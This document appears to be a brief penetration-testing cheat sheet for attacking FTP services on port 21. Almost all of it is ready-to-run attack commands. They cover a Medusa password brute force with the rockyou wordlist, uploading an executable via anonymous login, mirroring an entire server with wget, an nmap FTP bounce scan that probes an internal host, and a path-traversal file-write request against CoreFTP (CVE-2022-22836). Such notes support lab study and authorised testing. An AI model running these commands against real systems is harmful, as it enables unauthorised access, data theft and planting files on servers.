Listens 21


### Brute Force w/ Medusa
```bash
medusa -u [User] -P /usr/share/wordlists/rockyou.txt -h [FTP_IP] -M ftp 
```

### Use active mode, binary transfer, put .exe on Linux
```bash
ftp [FTP_IP]
# Login as anonymous; no pw
ftp> passive
	Passive mode: off; fallback to active mode: off
ftp> binary
	200 Type set to I.
ftp> put [File]
```

### Download everything from an FTP server
```bash
wget -m --no-passive ftp://anonymous:anonymous@[FTP_IP]
```

### Bounce Attack
```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
	 - Use external FTP server to gain info on internal endpoint


### CoreFTP Attack
```bash
curl -k -X PUT -H "Host: [FTP_IP]" --basic -u [User]:[Password] --data-binary "[Data]" --path-as-is https://[IP]/../../../../../../[Output_Filename]
```
	- CVE-2022-22836